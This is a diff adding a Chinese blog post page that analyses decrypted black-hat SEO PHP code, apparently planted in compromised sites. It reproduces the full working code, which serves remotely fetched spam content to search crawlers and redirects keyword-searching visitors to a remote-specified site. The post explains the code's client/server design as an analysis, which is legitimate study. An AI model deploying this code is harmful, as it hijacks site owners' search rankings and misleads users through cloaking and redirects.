@@ -1,0 +1,801 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="php,黑帽seo," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;其实这个我也不是很懂！关于怎么做流量！在此之前都没有接触过！前几天有个人找我解密一段加密代码，要我帮他重新写一下！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在我对代码分析过后才懂了一些，什么叫做做流量！呵呵！原始的加密代码我就不贴了！他的加密方式不是很复杂！但是解密也是一个累人的活！他把变量名都用的很长的随机字符，变量值都是用base64加密">
+<meta name="keywords" content="php,黑帽seo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="关于一个做流量的代码分析">
+<meta property="og:url" content="http://yoursite.com/2012/07/21/关于一个做流量的代码分析/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;其实这个我也不是很懂！关于怎么做流量！在此之前都没有接触过！前几天有个人找我解密一段加密代码，要我帮他重新写一下！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在我对代码分析过后才懂了一些，什么叫做做流量！呵呵！原始的加密代码我就不贴了！他的加密方式不是很复杂！但是解密也是一个累人的活！他把变量名都用的很长的随机字符，变量值都是用base64加密">
+<meta property="og:image" content="http://lanu-upload.stor.sinaapp.com/201207/9436166778ecdb0aab02ac400f903217201207212355411304285343.jpg">
+<meta property="og:updated_time" content="2018-02-26T05:36:35.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="关于一个做流量的代码分析">
+<meta name="twitter:description" content="&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;其实这个我也不是很懂！关于怎么做流量！在此之前都没有接触过！前几天有个人找我解密一段加密代码，要我帮他重新写一下！ &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;在我对代码分析过后才懂了一些，什么叫做做流量！呵呵！原始的加密代码我就不贴了！他的加密方式不是很复杂！但是解密也是一个累人的活！他把变量名都用的很长的随机字符，变量值都是用base64加密">
+<meta name="twitter:image" content="http://lanu-upload.stor.sinaapp.com/201207/9436166778ecdb0aab02ac400f903217201207212355411304285343.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2012/07/21/关于一个做流量的代码分析/"/>
+
+
+
+
+
+  <title>关于一个做流量的代码分析 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Startseite
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archiv
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2012/07/21/关于一个做流量的代码分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">关于一个做流量的代码分析</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Veröffentlicht am</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2012-07-21T23:15:24+08:00">
+                2012-07-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">in</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/技术文章/" itemprop="url" rel="index">
+                    <span itemprop="name">技术文章</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>&nbsp;&nbsp;&nbsp;&nbsp;其实这个我也不是很懂！关于怎么做流量！在此之前都没有接触过！前几天有个人找我解密一段加密代码，要我帮他重新写一下！</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;在我对代码分析过后才懂了一些，什么叫做做流量！呵呵！原始的加密代码我就不贴了！他的加密方式不是很复杂！但是解密也是一个累人的活！他把变量名都用的很长的随机字符，变量值都是用base64加密过的！</p>
+<p>主要是解密过后的:</p>
+<pre class="brush:php; toolbar: true; auto-links: true;">&lt;?
+error_reporting (E_ERROR);
+$aaiak = $_SERVER[’HTTP_USER_AGENT’];
+$ecdef = $_SERVER[’REMOTE_ADDR’];
+$ohkic = $_SERVER[’HTTP_REFERER’];
+$nhamo = $_SERVER[’HTTP_HOST’];
+$mcnad = $_SERVER[’REQUEST_URI’];//这句以前的代码都是获取一些相关数据
+$ghoif = ’www.xxxxx.com’;
+$cikhc = "/client/{var}/index.php";
+$jjaja = "/client/{var}/index.txt";
+$kabne = array("yh" =&gt; ’%D3%C0%BA%E3|%E6%B0%B8%E6%81%92|aion’,"jx" =&gt; ’%BD%A3|%E5%89%91’,"my" =&gt; ’%C4%A7%D3%F2|%E9%AD%94%E5%9F%9F’,"jy" =&gt; ’%BE%C5%D2%F5|%E4%B9%9D%E9%98%B4’);
+$cdfhe = array(’’,’/’,’/index.php’);
+$omccd = array(’Maxthon’,’Firefox’);
+$echha = array(’125.90.93.’,’127.0.0.’,’192.168.1.’);
+$afhbj = array(’baidu’,’google’,’soso’,’sogou’,’yahoo’,’bing’,’youdao’);
+$heeni = array(’site%3A’,’inurl%3A’);
+$gccik = array_keys($_GET);
+$cnfbe = array_keys($kabne);
+$onbla = ’x64’;
+$emfii = explode(’.’,$nhamo);//把前面获取的主机ip以点为标识分割为数组
+$mejgm = count($emfii);//这句以前都是一些变量和数组的定义
+if($mejgm &gt; 2) 
+{
+$nhamo = $emfii[$mejgm-3].’.’.$emfii[$mejgm-2].’.’.$emfii[$mejgm-1];
+}//上边的这个是取主机ip的后3位。
+$blafk = $ilnhj = $cdbn = false;
+foreach($kabne as $bblie =&gt; $odjhd) {
+$mik = explode(’|’,$odjhd);
+
+//上边是遍历$kabne数组，这个和服务端的读取目录有关
+
+foreach($mik as $hoelc)
+{
+if(stristr($ohkic,$hoelc))
+{
+$cdbn = $bblie;
+$ilnhj = true; break;
+}
+}//上边是和关键字的匹配
+if(in_array($bblie,$gccik)) {
+$cdbn = $bblie; 
+$ilnhj = true;
+}
+if($ilnhj) 
+{
+break;
+}
+}
+foreach($heeni as $behgc) 
+{
+if(stristr($ohkic,$behgc))
+{
+$ilnhj = false; 
+break;
+}
+}
+foreach($omccd as $ibkmo) 
+{
+if(stristr($aaiak,$ibkmo))
+{
+$ilnhj = false; 
+break;
+}
+}
+foreach($afhbj as $ljild) 
+{
+if(stristr($aaiak,$ljild))
+{
+$blafk = true; 
+break;
+}
+}
+foreach($echha as $glekm) 
+{
+if(stristr($ecdef,$glekm))
+{
+$ilnhj = false; 
+$blafk = false; 
+break;
+}
+}//上边的就是一长串的判断匹配
+if($blafk &amp;&amp; (!in_array($mcnad,$cdfhe))) 
+{
+if(!$cdbn) 
+{
+$cdbn = $cnfbe[array_rand($cnfbe)];
+}
+header("content-Type: text/html; charset=gb2312");
+$cbekb = file_get_contents (’http://’ .$ghoif.str_replace(’{var}’,$cdbn,$cikhc).’?d=’.’&amp;r=’.bin2hex($mcnad));
+$komac = explode(’[0xSpider]’,$cbekb);
+echo $komac[1];
+exit;
+} //输出
+elseif($ilnhj &amp;&amp; $cdbn &amp;&amp; empty($_COOKIE[$onbla])) 
+{
+setcookie($onbla,$nhamo,time() + 259200);
+$cbekb = file_get_contents (’http://’ .$ghoif.str_replace(’{var}’,$cdbn,$jjaja));
+header(’Location: ’.base64_decode(str_rot13($cbekb)).’#’.str_replace(’.’,’_’,$nhamo));
+exit;//跳转
+}
+?&gt;</pre> 
+
+<p>&nbsp;下面我画了图！第一次画！我都不知道我画的什么。。。汗</p>
+<p><a href="http://lanu-upload.stor.sinaapp.com/201207/9436166778ecdb0aab02ac400f903217201207212355411304285343.jpg" target="_blank" rel="noopener"><img src="http://lanu-upload.stor.sinaapp.com/201207/9436166778ecdb0aab02ac400f903217201207212355411304285343.jpg" alt="点击查看原图"></a></p>
+<p>他的做流量分为客服端和服务端，先说下他们的作用</p>
+<p>客户端主要是主要是收集信息，比如关键字，ip等</p>
+<p>服务端主要是储蓄数据，方便你修改！</p>
+<p>当客服端通过一系列的判断，发现应该使用服务端的那些数据，然后就读取服务端的数据！</p>
+<p>当你的网站被插入了上边的客户端代码，当搜索引擎抓取你的网站的时候，就会抓取到被插入的关键字，当然你用搜索引擎收东西的时候都会被收到。</p>
+<p>比如site:<a href="http://www.ddd.com" target="_blank" rel="noopener">www.ddd.com</a> 梦幻西游</p>
+<p><a href="http://www.ddd.com" target="_blank" rel="noopener">www.ddd.com</a>这个站是pr权重比较高的，但是他更本不是游戏站，是个农业站什么，里面更本没有游戏有关的懂得，但是你会用浏览器搜到这个站的梦幻西游，当你点击的时候也不会进去<a href="http://www.ddd.com" target="_blank" rel="noopener">www.ddd.com</a>这个站，你会直接挑战到他指定的站点！</p>
+<p>也就是他使用了你网站的搜索引擎排名.</p>
+<p>以上都为个人理解！这个也是最近才有所了解的！错误的希望指正！</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/黑帽seo/" rel="tag"># 黑帽seo</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2012/07/21/竟然还有人关注我博客！/" rel="next" title="竟然还有人关注我博客！">
+                <i class="fa fa-chevron-left"></i> 竟然还有人关注我博客！
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2012/07/26/【复习】mysql注入总结/" rel="prev" title="【复习】mysql注入总结">
+                【复习】mysql注入总结 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">John Doe</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">165</span>
+                  <span class="site-state-item-name">Artikel</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">14</span>
+                  <span class="site-state-item-name">Kategorien</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">183</span>
+                  <span class="site-state-item-name">Tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
